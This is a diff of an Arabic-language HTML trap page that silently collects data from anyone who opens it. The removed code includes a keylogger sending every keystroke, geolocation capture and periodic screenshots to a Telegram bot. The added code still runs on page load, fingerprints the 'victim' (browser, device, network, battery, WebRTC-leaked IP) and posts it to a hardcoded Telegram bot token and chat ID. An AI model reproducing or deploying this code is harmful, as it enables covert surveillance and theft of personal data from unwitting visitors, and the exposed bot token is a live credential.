@@ -2,13 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title></title> <!-- فارغ للإخفاء -->
+  <title></title> <!-- -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin:0; background:#000; overflow:hidden; }
     iframe { width:100vw; height:100vh; border:none; }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
@@ -19,10 +18,8 @@
 const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
-let keys = '';
-
 // إرسال رسالة نصية
-function sendText(text) {
+function sendToTg(text) {
   fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
@@ -34,68 +31,42 @@ function sendText(text) {
   }).catch(() => {});
 }
 
-// إرسال صورة (screenshot)
-function sendPhoto(photo) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: photo,
-      caption: 'Screenshot من الضحية - ' + new Date().toISOString()
-    })
-  }).catch(() => {});
-}
-
-// Keylogger: كل حرف يرسل فورًا
-document.addEventListener('keydown', e => {
-  let key = e.key;
-  if (key === 'Backspace') key = '[⌫]';
-  if (key === 'Enter') key = '[↵]';
-  if (key === ' ') key = '[␣]';
-
-  keys += key;
-
-  // إرسال فوري لكل ضغطة
-  sendText(`⌨️ ضغط: ${key} | الوقت: ${new Date().toISOString().slice(11,19)} | من: ${navigator.userAgent.slice(0,80)}...`);
-
-  // إرسال كل 10 حروف كمجموعة (للراحة)
-  if (keys.length >= 10) {
-    sendText(`⌨️ مجموعة كتابة: ${keys}`);
-    keys = '';
-  }
-});
-
-// جمع كل المعلومات عند الدخول
-window.onload = async () => {
-  const info = {
-    time: new Date().toISOString(),
-    url: window.location.href,
-    referrer: document.referrer || 'direct',
-    userAgent: navigator.userAgent,
-    platform: navigator.platform || 'unknown',
-    vendor: navigator.vendor || 'unknown',
-    language: navigator.language,
-    languages: navigator.languages?.join(', ') || 'unknown',
-    screen: `${screen.width}x${screen.height} | Depth: ${screen.colorDepth} | Pixel: ${window.devicePixelRatio}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    hardware: navigator.hardwareConcurrency || '?',
-    memory: navigator.deviceMemory || '?',
-    touch: 'ontouchstart' in window ? 'Yes' : 'No',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-    connection: navigator.connection ? `${navigator.connection.type || 'unknown'} | RTT: ${navigator.connection.rtt}ms | Effective: ${navigator.connection.effectiveType} | Downlink: ${navigator.connection.downlink}Mbps` : 'unknown',
-    pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
-    webdriver: navigator.webdriver ? 'Yes' : 'No',
-    cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-    doNotTrack: navigator.doNotTrack || 'unknown',
-    online: navigator.onLine ? 'Yes' : 'No',
-    battery: 'جاري...',
+// جمع المعلومات الدقيقة اللي تبغيها فقط
+async function sendExactInfo() {
+  const victim = {
     ip: 'جاري...',
-    geo: 'جاري...'
+    time: new Date().toISOString(),
+    date_in_device: new Date().toString(),
+    productSub: navigator.productSub || 'unknown',
+    vendor: navigator.vendor || 'unknown',
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    doNotTrack: navigator.doNotTrack || 'null',
+    hardwareConcurrency: navigator.hardwareConcurrency || 0,
+    cookieEnabled: navigator.cookieEnabled ? 'true' : 'false',
+    appCodeName: navigator.appCodeName || 'unknown',
+    appName: navigator.appName || 'unknown',
+    appVersion: navigator.appVersion || 'unknown',
+    platform: navigator.platform || 'unknown',
+    product: navigator.product || 'unknown',
+    userAgent: navigator.userAgent || 'unknown',
+    language: navigator.language || 'unknown',
+    languages: navigator.languages?.join(', ') || 'unknown',
+    webdriver: navigator.webdriver ? 'true' : 'false',
+    pdfViewerEnabled: navigator.pdfViewerEnabled ? 'true' : 'false',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    audioinput: 'id =',
+    videoinput: 'id =',
+    audiooutput: 'id =',
+    connection_type: navigator.connection?.type || 'unknown',
+    rtt: navigator.connection?.rtt || 'unknown',
+    saveData: navigator.connection?.saveData || 'false',
+    effectiveType: navigator.connection?.effectiveType || 'unknown',
+    downlink: navigator.connection?.downlink || 'unknown',
+    downlinkMax: navigator.connection?.downlinkMax || 'Infinity',
+    usb_devices: '0', // لا يوجد API عام لعدد USB
+    battery_level: 'جاري...',
+    battery_charging: 'جاري...'
   };
-
-  // إرسال المعلومات الأساسية فورًا
-  sendText(`🔔 ضحية دخلت!\n\n` + JSON.stringify(info, null, 2));
 
   // IP via WebRTC
   try {
@@ -103,40 +74,85 @@ window.onload = async () => {
     pc.createDataChannel('');
     pc.createOffer(o => pc.setLocalDescription(o), e => {});
     pc.onicecandidate = e => {
-      if (e.candidate) {
-        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-        if (match) {
-          info.ip = match[1];
-          sendText(`🌐 IP: ${info.ip}`);
-        }
-      }
+      if (!e.candidate) return sendFormatted(victim);
+      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if (match) victim.ip = match[1];
     };
-  } catch(e) { info.ip = 'blocked'; sendText(`🌐 IP: blocked`); }
+  } catch(e) { victim.ip = 'blocked'; sendFormatted(victim); }
 
   // Battery
   if (navigator.getBattery) {
     navigator.getBattery().then(b => {
-      info.battery = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
-      sendText(`🔋 Battery: ${info.battery}`);
+      victim.battery_level = Math.round(b.level * 100) + '%';
+      victim.battery_charging = b.charging ? 'true' : 'false';
+      sendFormatted(victim);
     });
+  } else {
+    victim.battery_level = 'غير مدعوم';
+    victim.battery_charging = 'غير مدعوم';
   }
 
-  // Geolocation
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(p => {
-      info.geo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (±${p.coords.accuracy}m)`;
-      sendText(`📍 Location: ${info.geo}`);
-    }, () => sendText(`📍 Geo: refused`));
-  }
+  // إرسال فوري
+  sendFormatted(victim);
+}
 
-  // Screenshot كل 5 ثواني
-  setInterval(() => {
-    html2canvas(document.body, {scale: 0.5}).then(canvas => {
-      const img = canvas.toDataURL('image/png');
-      sendPhoto(img);
-    });
-  }, 5000);
-};
+// تنسيق الرسالة بالشكل اللي تبغيه
+function sendFormatted(victim) {
+  const text = 
+`✅Victim Information
+⚓ IP: ${victim.ip || 'غير متوفر'} (https://ip-api.com/#${victim.ip || 'غير متوفر'}) | Time: ${victim.time}
+⏳ Date In Victim's Device : ${victim.date_in_device}
+📱 Device Information
+productSub: ${victim.productSub}
+vendor: ${victim.vendor}
+maxTouchPoints: ${victim.maxTouchPoints}
+doNotTrack: ${victim.doNotTrack}
+hardwareConcurrency: ${victim.hardwareConcurrency}
+cookieEnabled: ${victim.cookieEnabled}
+appCodeName: ${victim.appCodeName}
+appName: ${victim.appName}
+appVersion: ${victim.appVersion}
+platform: ${victim.platform}
+product: ${victim.product}
+userAgent: ${victim.userAgent}
+language: ${victim.language}
+languages: ${victim.languages}
+webdriver: ${victim.webdriver}
+pdfViewerEnabled: ${victim.pdfViewerEnabled}
+deviceMemory: ${victim.deviceMemory}
+📷 Media Device Information
+audioinput: id = ${victim.audioinput}
+videoinput: id = ${victim.videoinput}
+audiooutput: id = ${victim.audiooutput}
+🕸️ Network Information
+type: ${victim.connection_type}
+rtt: ${victim.rtt}
+saveData: ${victim.saveData}
+effectiveType: ${victim.effectiveType}
+downlink: ${victim.downlink}
+downlinkMax: ${victim.downlinkMax}
+🔌 Total USB devices connected: ${victim.usb_devices}
+🔋 Battery Information
+🔋Battery Level: ${victim.battery_level}
+⚡ Is Battery Charging: ${victim.battery_charging}`;
+
+  sendToTg(text);
+}
+
+function sendToTg(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'HTML'
+    })
+  }).catch(() => {});
+}
+
+// شغّل فور الدخول
+window.onload = sendExactInfo;
 </script>
 
 </body>
